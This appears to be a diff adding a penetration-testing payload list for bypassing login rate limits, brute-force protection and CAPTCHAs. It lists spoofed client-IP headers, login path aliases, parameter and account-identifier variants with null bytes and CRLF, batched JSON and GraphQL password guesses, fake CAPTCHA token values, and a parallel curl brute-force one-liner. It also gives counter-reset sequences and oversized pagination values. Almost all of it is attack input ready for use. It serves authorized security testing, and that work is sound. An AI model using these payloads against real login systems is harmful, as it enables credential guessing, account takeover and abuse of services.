@@ -1,0 +1,199 @@
+# Rate-Limit, Brute-Force and CAPTCHA Bypass Payloads
+# Use test accounts and a small cap on attempts. Change one variable per test and compare the block behaviour.
+
+# Client-IP header rotation (change the value on each request)
+X-Forwarded-For: 198.51.100.1
+X-Forwarded-For: 198.51.100.2
+X-Forwarded-For: 198.51.100.3, 198.51.100.4
+X-Forwarded-For: 127.0.0.1, 198.51.100.5
+X-Forwarded-For: 198.51.100.6, 127.0.0.1
+X-Forwarded-For: ::ffff:198.51.100.7
+X-Forwarded-For: 198.51.100.8:1234
+X-Forwarded-For: unknown
+X-Forwarded-For: 0
+X-Forwarded-For: 2001:db8::1
+X-Forwarded-For:
+X-Remote-IP: 198.51.100.9
+X-Remote-Addr: 198.51.100.10
+X-ProxyUser-Ip: 198.51.100.11
+X-Original-Forwarded-For: 198.51.100.12
+X-Forwarded: 198.51.100.13
+Forwarded-For: 198.51.100.14
+Forwarded: for=198.51.100.15
+Forwarded: for="[2001:db8::2]"
+X-Cluster-Client-IP: 198.51.100.16
+X-Custom-IP-Authorization: 198.51.100.17
+Fastly-Client-IP: 198.51.100.18
+X-Azure-ClientIP: 198.51.100.19
+X-Azure-SocketIP: 198.51.100.20
+X-Appengine-User-IP: 198.51.100.21
+CF-Connecting-IP: 198.51.100.22
+CF-Connecting-IPv6: 2001:db8::3
+X-Envoy-External-Address: 198.51.100.23
+X-Envoy-Original-Path: /login
+
+# Endpoint aliases that may map to the same handler with a separate counter
+/login/
+/login//
+/login/.
+/login/./
+/Login
+/LOGIN
+/login%20
+/login%09
+/login%00
+/login%2f
+/login;x
+/login;/
+/login..;/
+/login.json
+/login.html
+/login.php
+/login?x=1
+/login?x=2
+/login#x
+/%6cogin
+/api/login
+/api/v1/login
+/api/v2/login
+/api/v3/login
+/v1/login
+/v2/login
+/mobile/login
+/m/login
+/legacy/login
+/auth/login
+/auth/v1/login
+/users/sign_in
+/session
+/sessions
+/signin
+/sign-in
+/account/login
+/user/login
+
+# Method and content-type variations
+GET /login?user=test&pass=wrong
+PUT /login
+PATCH /login
+OPTIONS /login
+Content-Type: multipart/form-data; boundary=x
+X-HTTP-Method-Override: POST
+X-Method-Override: POST
+
+# Parameter noise (each request looks different to a naive key)
+user=test&pass=wrong&_=1
+user=test&pass=wrong&_=2
+user=test&pass=wrong&cb=a1
+user=test&pass=wrong&nonce=n1
+user=test&pass=wrong&timestamp=1700000000
+user=test&pass=wrong&x[]=1
+user=test&pass=wrong&&&
+user=test&pass=wrong&user=test
+user=test&pass=wrong&pass=wrong2
+
+# Account identifier variants that may keep separate counters but map to one account
+user=test@example.test
+user=Test@example.test
+user=TEST@EXAMPLE.TEST
+user=test@Example.test
+user=test+1@example.test
+user=test+a@example.test
+user=te.st@example.test
+user=test@example.test%20
+user=%20test@example.test
+user=test@example.test%00
+user=test@example.test.
+user=test%40example.test
+user=tést@example.test
+user=test@exampl%C3%A9.test
+user=%EF%BC%B4est@example.test
+user=test@example.test%0d%0a
+
+# JSON and GraphQL batching (many attempts in one request)
+[{"user":"test","pass":"p1"},{"user":"test","pass":"p2"},{"user":"test","pass":"p3"},{"user":"test","pass":"p4"},{"user":"test","pass":"p5"}]
+{"user":"test","pass":["p1","p2","p3","p4","p5"]}
+{"user":"test","pass":"p1","pass":"p2"}
+{"query":"mutation{a:login(user:\"test\",pass:\"p1\"){token} b:login(user:\"test\",pass:\"p2\"){token} c:login(user:\"test\",pass:\"p3\"){token}}"}
+[{"query":"mutation{login(user:\"test\",pass:\"p1\"){token}}"},{"query":"mutation{login(user:\"test\",pass:\"p2\"){token}}"}]
+{"operations":"[{\"query\":\"mutation{login(user:\\\"test\\\",pass:\\\"p1\\\"){token}}\"},{\"query\":\"mutation{login(user:\\\"test\\\",pass:\\\"p2\\\"){token}}\"}]"}
+
+# Header and session variations (a new identity for the limiter)
+User-Agent: Mozilla/5.0 rate-test-1
+User-Agent: Mozilla/5.0 rate-test-2
+Accept-Language: en-US
+Accept-Language: de-DE
+Origin: https://app.example.test
+Origin: https://other.example.test
+Referer: https://app.example.test/login
+Referer: https://app.example.test/login?x=1
+Cookie: session=NEW_SESSION_1
+Cookie: session=NEW_SESSION_2
+Cookie:
+X-Request-ID: rate-1
+X-Request-ID: rate-2
+X-Device-ID: device-1
+X-Device-ID: device-2
+X-Api-Key: TEST_KEY_1
+X-Api-Key: TEST_KEY_2
+Authorization: Bearer TEST_TOKEN_1
+Authorization: Bearer TEST_TOKEN_2
+
+# Counter-reset checks (sequence descriptions)
+# Make N-1 wrong attempts, log in successfully to your own other account, then make more wrong attempts and see whether the counter was cleared
+# Make N-1 wrong attempts, request a password reset or resend, then continue
+# Make N-1 wrong attempts, open a new session or restart the flow, then continue
+# Wait for the stated lockout period and check that the next failure restarts the lockout
+# Check whether lockout is per account (denial-of-service risk for the owner) or per source
+
+# Concurrency checks (see Race-Conditions): send many attempts in parallel before the counter increments
+# seq 1 50 | xargs -P 25 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST https://app.example.test/login -d "user=test&pass=wrong{}"
+
+# Origin, protocol and network-path checks
+# Send the same attempts directly to an origin IP that skips the CDN or WAF, using the correct Host header
+# Compare HTTP/1.1 and HTTP/2 behaviour
+# Compare IPv4 and IPv6 behaviour
+# Send requests through different regional endpoints and compare counters
+
+# CAPTCHA bypass: parameter tests (submit with these in place of a valid token)
+g-recaptcha-response=test
+g-recaptcha-response=null
+g-recaptcha-response[]=
+cf-turnstile-response=
+captcha=0
+captcha=1234
+captcha=true
+captcha=null
+captcha[]=
+captcha_id=
+recaptcha_token=
+{"captcha":""}
+{"captcha":null}
+{"captcha":true}
+{"captcha":[]}
+{"captcha":0}
+
+# CAPTCHA bypass: structural tests
+# Omit the CAPTCHA parameter entirely
+# Replay a previously valid token on a second request and a later session
+# Use a token issued for a different action or form
+# Use the CAPTCHA only on the first request and reuse the session for the rest
+# Switch the content type or the HTTP method
+# Call the API or mobile endpoint that backs the form and check whether it requires the CAPTCHA
+# Check that the answer is validated server-side and not stored client-side or in a cookie
+# Check for the answer in the HTML, a cookie, an image file name or an API response
+# Check that the audio or accessibility alternative is not weaker
+# Check that the same image can be solved once and replayed
+
+# Resource-based limit tests on non-login endpoints
+# Export, report and search endpoints with large page sizes: ?limit=100000, ?per_page=100000, ?page_size=100000
+# SMS and email sending: request many sends to your own number or mailbox and count
+# Password reset and invite endpoints: compare limits per account and per source
+# File upload and image processing: send many small requests and a few large ones
+?limit=1000000
+?per_page=1000000
+?page_size=1000000
+?size=1000000
+?count=1000000
+?first=1000000
+?take=1000000
